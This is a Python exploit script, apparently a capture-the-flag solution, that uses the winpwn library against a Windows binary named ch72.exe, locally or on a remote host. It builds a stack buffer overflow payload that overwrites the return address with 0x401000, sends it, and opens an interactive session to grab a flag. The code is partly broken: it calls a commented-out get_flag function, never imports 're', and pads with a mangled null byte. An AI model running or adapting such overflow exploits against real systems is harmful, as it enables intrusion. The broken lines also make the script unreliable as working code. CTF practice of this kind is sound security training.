from winpwn import *
import os
import traceback
import sys
context.log_level='debug'
# context.arch='amd64'
context.arch='i386'

# file_name=ELF('./file_name', checksec = False)

def get_sh():
    if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE' :
        return remote(sys.argv[2],sys.argv[3])
    else:
        return process("./ch72.exe")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string).strip(end_string),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].strip(end_string).ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        print(info + str(hex(return_address)))
    return return_address

# def get_flag(sh):
#     sh.sendline('cat /flag')
#     return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    windbgx.attach(sh)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        payload  = 'a' * 0x14 + p32(0xDEADBEEF)
        payload += p32(0x401000)
        # get_gdb(sh)
        sh.sendline(payload)
        sh.interactive()
        flag=get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    os.system("")
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag{.+}',flag).group())